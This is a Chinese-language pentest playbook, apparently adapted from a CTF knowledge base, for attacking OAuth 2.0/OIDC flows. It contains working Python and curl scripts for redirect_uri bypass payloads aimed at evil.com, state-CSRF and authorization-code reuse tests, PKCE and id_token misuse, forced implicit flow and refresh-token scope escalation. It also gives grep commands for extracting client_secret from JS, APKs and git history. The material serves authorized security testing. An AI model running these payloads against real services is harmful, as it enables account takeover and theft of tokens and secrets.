# OAuth 2.0 / OIDC 攻击实战

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/oauth-sso.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「OAuth / OIDC / redirect_uri / state」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- OAuth
- OIDC
- redirect_uri
- state
- PKCE
- code reuse
- ID Token
- client_secret
- SSO

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **`/userinfo`** — 返回 sub/email
2. **`/api/me`** — 返回当前用户
3. **`/api/admin`** — 403→200 或数据变化
4. **GraphQL** — `viewer`/`me` 字段
5. **WebSocket** — `connection_ack`

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **成功 oracle** — code/token 到攻击者回调
- **成功 oracle** — login CSRF、账号错绑
- **成功 oracle** — id_token 被接受
- **成功 oracle** — token endpoint 返回 access_token
- **成功 oracle** — API 接受错 token
- **成功 oracle** — 新 token scope 增加
- **成功 oracle** — 账号绑定到错误主体
- **成功信号** — 返回 sub/email
- **成功信号** — 返回当前用户
- **成功信号** — 403→200 或数据变化
- **成功信号** — `viewer`/`me` 字段
- **成功信号** — `connection_ack`

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 攻击面

```
OAuth 流程四阶段，每阶段都有攻击点:

  Client ──▶ /authorize ──▶ /token ──▶ /userinfo ──▶ API
              │   ▲           │  ▲        │  ▲
              │ redirect_uri  │ code      │  ID Token
              │ state/nonce   │ reuse     │  aud 缺失
              │ PKCE          │           │
```

### 0.1 Flow 字段绑定到 Token/API Oracle

OAuth/OIDC 的核心是字段绑定关系。每个 `code/state/nonce/redirect_uri/client_id/aud/iss/sub/scope` 都要落到一个可观察 oracle：能否换 token、token 能访问哪个 API、是否能触发支付/订单/后台动作。

| 字段 | 绑定对象 | 错配实验 | 成功 oracle | 下一跳 |
|---|---|---|---|---|
| `redirect_uri` | client + code | 同 client 换 path/host/open redirect | code/token 到攻击者回调 | Host Header、Open Redirect |
| `state` | browser session | 固定/空/跨 session | login CSRF、账号错绑 | Replay/nonce |
| `nonce` | id_token + session | 重放旧 id_token | id_token 被接受 | JWT |
| `code` | client + redirect + PKCE | 跨 client/跨 session 换 token | token endpoint 返回 access_token | 签名/重放 |
| `aud`/`azp` | API/client | ID token 调 API、换 client | API 接受错 token | BAC/IDOR |
| `scope` | client grant | refresh 扩权、device flow 扩权 | 新 token scope 增加 | 业务权限 |
| `email`/`sub`/`iss` | 用户身份 | 同邮箱跨 IdP | 账号绑定到错误主体 | LDAP/SAML |

Token oracle 记录器：

```python
# oauth_token_oracle_matrix.py
import base64
import csv
import json
from pathlib import Path
import requests

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) < 2:
        return {}
    payload = parts[1] + "=" * (-len(parts[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()))

def call_api(api_url, token):
    r = requests.get(api_url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
    return {"status": r.status_code, "length": len(r.text), "sample": r.text[:180].replace("\n", "\\n")}

def record_tokens(cases, api_url, out="exports/oauth_token_oracle_matrix.csv"):
    rows = []
    for name, token in cases.items():
        claims = decode_jwt(token)
        api = call_api(api_url, token)
        rows.append({
            "case": name,
            "iss": claims.get("iss", ""),
            "sub": claims.get("sub", ""),
            "aud": claims.get("aud", ""),
            "azp": claims.get("azp", ""),
            "scope": claims.get("scope", ""),
            "api_status": api["status"],
            "api_length": api["length"],
            "api_sample": api["sample"],
        })
    Path(out).parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w", newline="", encoding="utf-8") as f:
        if not rows:
            f.write("case,iss,sub,aud,azp,scope,api_status,api_length,api_sample\n")
            return []
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
    return rows
```

执行节奏：

1. 先抓完整 authorize/token/userinfo/API 四段请求，建立 baseline。
2. 对 redirect_uri/state/nonce/PKCE/code/client_id 单变量错配，记录每次 token endpoint 结果。
3. 每个 access_token/id_token 都跑 `oauth_token_oracle_matrix.csv`，看 API 是否接受错类型 token。
4. 命中 `aud/azp/scope` 错配后，转 BAC/订单/支付 API，看权限是否扩大。
5. 命中 `email/sub/iss` 错绑后，转 LDAP/SAML/JWT 文档补身份源链。

## 1. redirect_uri 攻击

```python
# 探测 redirect_uri 验证逻辑
import requests

TARGET = "https://target.com/oauth/authorize"
CLIENT_ID = "from_app_registration"

PAYLOADS = [
    # 基础开放重定向
    "https://evil.com/callback",
    # 子域名欺骗
    "https://target.com.evil.com/callback",
    # 协议相对
    "//evil.com/callback",
    # userinfo 混淆
    "https://target.com@evil.com/callback",
    # 未注册但同域的路径
    "https://target.com/other-app/callback",
    # 参数污染 (两个 redirect_uri)
    "https://legit.com/callback&redirect_uri=https://evil.com/callback",
    # fragment 混淆
    "https://legit.com/callback#@evil.com/callback",
    # 开放重定向链
    "https://legit.com/callback?next=https://evil.com",
]

for uri in PAYLOADS:
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": uri,
        "scope": "openid profile email",
        "state": "x"
    }
    r = requests.get(TARGET, params=params, allow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("Location", "")
        if "evil.com" in loc:
            print(f"[!] BYPASS: {uri} → {loc}")
    elif "invalid" not in r.text.lower():
        print(f"[?] UNKNOWN: {uri} → {r.status_code}")
```

### 1.1 redirect_uri 规范化矩阵

| 变体 | Payload | 目标差异 |
|---|---|---|
| 子域混淆 | `https://target.com.evil.com/cb` | `startswith("https://target.com")` |
| UserInfo | `https://target.com@evil.com/cb` | parser 取 host 不一致 |
| Fragment | `https://target.com/cb#@evil.com` | 校验含 fragment，下游丢 fragment |
| Path traversal | `https://target.com/oauth/cb/../evil` | normalize 前后路径不同 |
| 双编码 | `https://target.com%252fevil.com/cb` | decode 次数不同 |
| 参数污染 | `redirect_uri=legit&redirect_uri=evil` | IdP/SP 取首尾不同 |
| Open redirect | `https://target.com/redirect?next=https://evil.com` | 白名单只看第一跳 |
| Scheme 降级 | `http://target.com/cb` | code/token 经明文跳转 |

命中判断：看最终 `Location` 里 `code`、`token`、`state` 是否进入攻击者域；如果只跳到登录页，说明 authorize 还没完成，需带有效 session 再测。

### 1.2 授权请求字段绑定

| 字段 | 必须绑定对象 | 可测错配 |
|---|---|---|
| `code` | client_id + redirect_uri + session + PKCE | 换 client/token endpoint 复用 |
| `state` | 浏览器 session | 固定值/空值/跨 session |
| `nonce` | id_token + session | 重放 id_token |
| `code_challenge` | authorization code | 不带 verifier 换 token |
| `aud` | client_id/API | ID Token 调 API |
| `iss` | IdP | 邮箱同名跨 IdP 绑定 |
| `sub` | IdP 内稳定用户 ID | 只按 email 绑定 |

## 2. state/nonce 缺失 → CSRF

```python
# 如果没有 state 或 state 可预测:
# 攻击者先用自己的账号完成 OAuth，拿到 code
# 然后诱导受害者访问:
#   https://target.com/oauth/callback?code=ATTACKER_CODE&state=KNOWN
# 受害者浏览器发起请求 → 服务端把攻击者的 code 换成 access_token
# → 受害者浏览器存储攻击者的 token → 受害者以攻击者身份操作
# 攻击者再读自己账号下的内容 → 可能看到受害者误传的数据

# 检测脚本
def test_state_csrf(auth_url: str, client_id: str, redirect_uri: str):
    # 步骤 1: 不传 state
    r1 = requests.get(auth_url, params={
        "response_type": "code", "client_id": client_id,
        "redirect_uri": redirect_uri
    }, allow_redirects=False)
    if r1.status_code in (301, 302):
        print("[i] No state required — CSRF possible")

    # 步骤 2: state 可预测? (如: 固定值, 递增数字, base64(时间戳))
    for guess in ["1", "state", "ok", "true", "test", "x"]:
        r2 = requests.get(auth_url, params={
            "response_type": "code", "client_id": client_id,
            "redirect_uri": redirect_uri, "state": guess
        })
        if "invalid" not in r2.text.lower():
            print(f"[!] Predictable state: {guess}")
```

## 3. code 复用

```python
# 如果同一个 authorization code 可以被不同用户使用:
#   → code 没有绑定 session/client
# 测试方法:
# 1. 用账号 A 拿到 code
# 2. 清空 cookie，换 IP
# 3. 用账号 B 的 session 去 /token 换 token
# 4. 如果换成功 → code 未绑定 client

def test_code_reuse(token_url: str, code: str, client_id: str, redirect_uri: str):
    # 第一次: 正常换取 token
    r1 = requests.post(token_url, data={
        "grant_type": "authorization_code", "code": code,
        "client_id": client_id, "redirect_uri": redirect_uri
    })
    assert r1.status_code == 200, "First exchange failed"
    token1 = r1.json().get("access_token")

    # 第二次: 相同的 code 再次换取
    r2 = requests.post(token_url, data={
        "grant_type": "authorization_code", "code": code,
        "client_id": client_id, "redirect_uri": redirect_uri
    })
    if r2.status_code == 200:
        print("[!] Code reuse possible!")
```

## 4. 邮箱关联账号劫持

```python
# 场景: 系统允许 Google/Facebook/GitHub 登录
# 如果登录逻辑是: 查邮箱 → 有则绑定账号
# 而没有验证 iss (签发者):

# 攻击:
# 1. 在 IdP-A (如 GitHub) 注册 target@company.com 邮箱
#    (GitHub 不验证邮箱所有权)
# 2. 用 GitHub OAuth 登录 → 系统查到 target@company.com
#    已有关联账号 → 绑定成功 → 登录为目标用户

# 实战判断: 如果只按 email 绑定账号，而不校验 iss/sub/email_verified，
# 同邮箱或同名邮箱场景就可能产生账号错绑。
```

## 5. PKCE 缺失

```python
# 如果没有 PKCE (Proof Key for Code Exchange):
# 恶意应用可以拦截 authorization code

# 检测: 看 /authorize 是否需要 code_challenge 参数
r = requests.get("https://target.com/oauth/authorize", params={
    "response_type": "code", "client_id": "public_client_id",
    "redirect_uri": "app://callback",
    "code_challenge": "invalid_challenge",
    "code_challenge_method": "S256"
})
# 如果返回 200 且不带 code_challenge 也能拿到 code → PKCE 非强制
```

### 5.1 PKCE 交换脚本

```python
import base64
import hashlib
import os

def pkce_pair():
    verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode()).digest()
    ).rstrip(b"=").decode()
    return verifier, challenge

verifier, challenge = pkce_pair()
print("code_verifier =", verifier)
print("code_challenge =", challenge)
```

错配实验：

```text
1. authorize 带 code_challenge=A，token 不带 code_verifier
2. authorize 带 code_challenge=A，token 带 code_verifier=B
3. authorize 不带 code_challenge，token 带任意 verifier
4. 两个浏览器 session 交换 code/code_verifier
```

命中样本：错误 verifier 仍返回 access_token；或 code 能被另一个 session/client 换 token。

## 6. ID Token 当 Access Token

```python
# 抓取 OIDC 流程中的 id_token
# 尝试用 id_token 调用 API:
resp = requests.get("https://target.com/api/user/profile",
    headers={"Authorization": f"Bearer {id_token}"})
# 如果 200 → ID Token 被当作 Access Token 接受
# 可能绕过 scope 限制 (ID Token 不包含 scope claim)
```

### 6.1 Token Oracle 矩阵

同一个 token 要打多个 API oracle，不要只看 `/me`：

| Oracle | 目标 | 成功信号 |
|---|---|---|
| `/userinfo` | access_token 是否被 IdP 接受 | 返回 sub/email |
| `/api/me` | Resource server 是否验 `aud` | 返回当前用户 |
| `/api/admin` | scope/role 是否生效 | 403→200 或数据变化 |
| GraphQL | Bearer 是否进入 resolver | `viewer`/`me` 字段 |
| WebSocket | token 是否可握手 | `connection_ack` |

```python
import requests

def token_oracle(token, endpoints):
    for name, url in endpoints.items():
        r = requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=8)
        print(name, r.status_code, r.text[:180])
```

## 7. Implicit Flow 攻击

```python
# Implicit Flow 直接在 URL fragment 中返回 access_token
# https://target.com/callback#access_token=xxx&token_type=bearer

# 攻击面:
# 1. Referer 泄露 token (fragment 可能在 Referer 中)
# 2. history 窃取
# 3. 如果没验证 redirect_uri → 直接拿 token

# 强制 implicit flow (如果 authorization_code 受限)
def force_implicit(client_id: str, redirect_uri: str):
    return requests.get("https://target.com/oauth/authorize", params={
        "response_type": "token",      # ← implicit 模式
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "openid profile admin",
        "state": "x"
    })
```

## 8. Client Secret 提取

```bash
# 常见泄露位置:
# 1. JS 源码硬编码
grep -r "client_secret\|clientSecret\|CLIENT_SECRET" --include="*.js" .
# 2. 移动端 APK 反编译
strings app.apk | grep -i "client_secret\|secret"
# 3. Source maps / .map 文件
# 4. Public config endpoints: /config, /env, /.env
# 5. Git 历史
git log -p | grep -i "client_secret"

# 拿到 client_secret 后 → 可进行 confidential client 的所有操作
```

## 9. Device Code Flow 滥用

```python
# Device Code Flow (设备授权) — 适用于 TV/IoT
# 如果未限制 device_code 速率:
# 1. 持续尝试 user_code → 可能暴力猜解
# 2. 短间隔轮询 → 等待用户输入后立即换取 token
# https://target.com/oauth/device/code
```

### 9.1 Refresh Token / Scope 变形

```bash
# scope 扩权尝试
curl -X POST "$TOKEN" \
  -d "grant_type=refresh_token&refresh_token=$RT&client_id=$CID&scope=openid profile email admin offline_access"

# client 混用
curl -X POST "$TOKEN" \
  -d "grant_type=refresh_token&refresh_token=$RT&client_id=other_client"
```

判断点：

- 新 access_token 的 `scope` 是否比原 token 多。
- refresh_token 是否可跨 client 使用。
- `azp`、`aud`、`iss` 是否和当前 API 匹配。
- refresh 后旧 access_token 是否仍可用。

## 工具命令

```bash
# 完整 OAuth 流程抓取
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://callback&scope=openid%20profile&state=x"
curl -X POST "https://target.com/oauth/token" -d "grant_type=authorization_code&code=xxx&client_id=xxx&redirect_uri=https://callback"
curl -X POST "https://target.com/oauth/token" -d "grant_type=refresh_token&refresh_token=xxx&client_id=xxx"
curl -X POST "https://target.com/oauth/token" -d "grant_type=client_credentials&client_id=xxx&client_secret=xxx"
python3 jwt_tool.py <id_token>
curl https://target.com/.well-known/openid-configuration | jq .
```

## Evidence

记录: 完整流程每个 HTTP 请求/响应、authorize 参数、redirect_uri payload、code 与 token 交换结果、PKCE verifier/challenge、id_token/access_token/refresh_token 的 claims、client_secret 来源、`oauth_token_oracle_matrix.csv`、token 能访问的 API 和失败样本。

## 工作流

建立 baseline → 抓完整 authorize/token/userinfo/API 请求 → 确认字段绑定关系 → 对 redirect_uri/state/nonce/PKCE/aud/iss 做单变量错配 → 用 token oracle 验证权限变化 → 保存成功样本和失败样本。
